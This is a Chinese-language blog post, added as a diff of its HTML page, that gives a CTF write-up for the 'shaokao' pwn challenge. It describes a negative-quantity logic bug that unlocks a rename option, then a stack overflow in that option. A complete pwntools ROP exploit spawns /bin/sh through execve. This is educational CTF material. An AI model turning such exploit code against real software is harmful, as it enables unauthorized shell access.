@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="对于这道题目的定义   这是一道ret2syscall类型的题目 运行程序 可以发现一开始你的钱包余额为233块，买啤酒十块钱一瓶买烤串五块钱一串。ida打开程序我们可以发现有一个vip函数:意思是我们可以花10000块买下整个店。 如何买下整个店呢？你可以买啤酒或者炸串的时候在选择负号+数字瓶或者串就能够获得相应的钱了。我们可以用这个方法把整个烧烤摊买下来。 把烧烤摊买下来之后我们就会发现多出了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="https://dinkjun.github.io/2023/05/29/shaokao/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="对于这道题目的定义   这是一道ret2syscall类型的题目 运行程序 可以发现一开始你的钱包余额为233块，买啤酒十块钱一瓶买烤串五块钱一串。ida打开程序我们可以发现有一个vip函数:意思是我们可以花10000块买下整个店。 如何买下整个店呢？你可以买啤酒或者炸串的时候在选择负号+数字瓶或者串就能够获得相应的钱了。我们可以用这个方法把整个烧烤摊买下来。 把烧烤摊买下来之后我们就会发现多出了">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://dinkjun.github.io/2023/05/29/shaokao/shaokao.png">
+<meta property="article:published_time" content="2023-05-29T13:29:01.312Z">
+<meta property="article:modified_time" content="2023-05-29T13:35:28.713Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://dinkjun.github.io/2023/05/29/shaokao/shaokao.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://dinkjun.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-shaokao" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/05/29/shaokao/" class="article-date">
+  <time datetime="2023-05-29T13:29:01.312Z" itemprop="datePublished">2023-05-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="对于这道题目的定义"><a href="#对于这道题目的定义" class="headerlink" title="对于这道题目的定义"></a>对于这道题目的定义</h2><p>   这是一道ret2syscall类型的题目</p>
+<h2 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h2><ol>
+<li>可以发现一开始你的钱包余额为233块，买啤酒十块钱一瓶买烤串五块钱一串。<br>ida打开程序我们可以发现有一个vip函数:意思是我们可以花10000块买下整个店。<br><img src="/2023/05/29/shaokao/shaokao.png" alt="Alt text"></li>
+<li>如何买下整个店呢？你可以买啤酒或者炸串的时候在选择负号+数字瓶或者串就能够获得相应的钱了。我们可以用这个方法把整个烧烤摊买下来。</li>
+<li>把烧烤摊买下来之后我们就会发现多出了一个改名的选项，我们选择进入这个选项，这里就是我们进行栈溢出的地方了！！！</li>
+</ol>
+<h2 id="查找gadget、system的地址"><a href="#查找gadget、system的地址" class="headerlink" title="查找gadget、system的地址"></a>查找gadget、system的地址</h2><h2 id="最终的exp"><a href="#最终的exp" class="headerlink" title="最终的exp"></a>最终的exp</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = <span class="title function_">process</span>(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line">io.<span class="title function_">recv</span>()</span><br><span class="line">io.<span class="title function_">sendline</span>(b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.<span class="title function_">recv</span>()</span><br><span class="line">io.<span class="title function_">sendline</span>(b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.<span class="title function_">recv</span>()</span><br><span class="line">io.<span class="title function_">sendline</span>(b<span class="string">&quot;-100000&quot;</span>)</span><br><span class="line">io.<span class="title function_">recv</span>()</span><br><span class="line">io.<span class="title function_">sendline</span>(b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">io.<span class="title function_">recv</span>()</span><br><span class="line">io.<span class="title function_">sendline</span>(b<span class="string">&quot;5&quot;</span>)</span><br><span class="line">binsh_addr = <span class="number">0x4e60f0</span></span><br><span class="line">pop_rax_rdx_rbx = <span class="number">0x4a404a</span></span><br><span class="line">#pop_rdx_rbx = <span class="number">0x4a404b</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x40264f</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x40a67e</span></span><br><span class="line">system_addr = <span class="number">0x402404</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">payload = b<span class="string">&quot;/bin/sh\x00;&quot;</span>+ b<span class="string">&quot;A&quot;</span>*<span class="number">31</span> + <span class="title function_">p64</span>(pop_rax_rdx_rbx) + <span class="title function_">p64</span>(<span class="number">0x3b</span>) + <span class="title function_">p64</span>(<span class="number">0</span>) + <span class="title function_">p64</span>(<span class="number">0</span>) + <span class="title function_">p64</span>(pop_rdi_ret) + <span class="title function_">p64</span>(binsh_addr) + <span class="title function_">p64</span>(pop_rsi_ret) + <span class="title function_">p64</span>(<span class="number">0</span>) + <span class="title function_">p64</span>(system_addr)</span><br><span class="line">io.<span class="title function_">recv</span>()</span><br><span class="line">io.<span class="title function_">sendline</span>(payload)</span><br><span class="line">io.<span class="title function_">interactive</span>()</span><br></pre></td></tr></table></figure>
+<p><strong>最后的最后要注意因为我们payload中的/bin/sh是要传递给execve系统调用的参数，然而后面还跟了一大串的垃圾数据(拿来栈溢出的，这不是我们要的参数)，所以我们需要在/bin/sh跟上\x00用来进行截断才行</strong></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dinkjun.github.io/2023/05/29/shaokao/" data-id="cli8w8ea20000iwv90gwq7s4k" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/05/29/ciscn2023pwn%E9%A2%98/canary%E7%88%86%E7%A0%B4/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/05/29/shaokao/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/29/ciscn2023pwn%E9%A2%98/canary%E7%88%86%E7%A0%B4/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
